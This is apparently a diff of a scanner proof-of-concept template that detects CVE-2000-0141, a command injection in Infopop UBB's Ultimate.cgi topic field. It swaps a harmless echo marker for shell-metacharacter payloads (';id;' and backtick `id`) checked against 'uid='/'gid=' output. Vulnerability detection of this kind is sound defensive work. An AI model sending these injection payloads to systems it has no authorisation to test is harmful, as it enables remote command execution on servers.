@@ -1,14 +1,10 @@
 [info]
-author = "AVE"
-description = "检测 Infopop Ultimate Bulletin Board 的 topic 隐藏字段命令注入漏洞。远程攻击者可通过在 topic 参数中注入 shell 元字符实现任意命令执行，CVSS 10.0。"
+author = "ave"
+description = "Infopop Ultimate Bulletin Board (UBB) 在主题发布功能中，隐藏字段（topic hidden field）未经净化即传入系统 shell，攻击者通过构造包含 shell 元字符（如反引号、$()、; 等）的 POST 请求实现远程命令执行。影响 UBB 5.18 之前所有版本。"
 id = "POC-AVE-2000-0408"
-name = "CVE-2000-0141 PoC"
+name = "Infopop UBB Topic Hidden Field Command Injection PoC"
 severity = "critical"
-tags = [
-    "cve-2000-0141",
-    "command-injection",
-    "ubb",
-]
+tags = ["ave-2000-0408"]
 vuln_id = [
     "CVE-2000-0141",
     "AVE-2000-0408",
@@ -19,11 +15,11 @@ logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/Ultimate.cgi"
+path = "/{{BaseURL}}/cgi-bin/Ultimate.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "topic=normal%3Becho+UBB_INJECTION_MARKER_2000&action=post"
+content = "action=post&topic=test%3Bid%3B&message=test&ubb=limited"
 type = "raw"
 
 [poc.requests.headers]
@@ -34,7 +30,10 @@ User-Agent = "AVE/1.0"
 expect = true
 part = "body"
 type = "word"
-words = ["UBB_INJECTION_MARKER_2000"]
+words = [
+    "uid=",
+    "gid=",
+]
 
 [[poc.requests]]
 method = "POST"
@@ -42,7 +41,7 @@ path = "/{{BaseURL}}/cgi-bin/Ultimate.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "topic=normal%3Becho+UBB_INJECTION_MARKER_2000&action=post"
+content = "action=post&topic=`id`&message=test&ubb=limited"
 type = "raw"
 
 [poc.requests.headers]
@@ -53,42 +52,7 @@ User-Agent = "AVE/1.0"
 expect = true
 part = "body"
 type = "word"
-words = ["UBB_INJECTION_MARKER_2000"]
-
-[[poc.requests]]
-method = "POST"
-path = "/{{BaseURL}}/ubb/Ultimate.cgi"
-protocol = "http"
-
-[poc.requests.body]
-content = "topic=normal%3Becho+UBB_INJECTION_MARKER_2000&action=post"
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["UBB_INJECTION_MARKER_2000"]
-
-[[poc.requests]]
-method = "POST"
-path = "/{{BaseURL}}/ubbmisc.cgi"
-protocol = "http"
-
-[poc.requests.body]
-content = "topic=normal%3Becho+UBB_INJECTION_MARKER_2000&action=post"
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["UBB_INJECTION_MARKER_2000"]
+words = [
+    "uid=",
+    "gid=",
+]
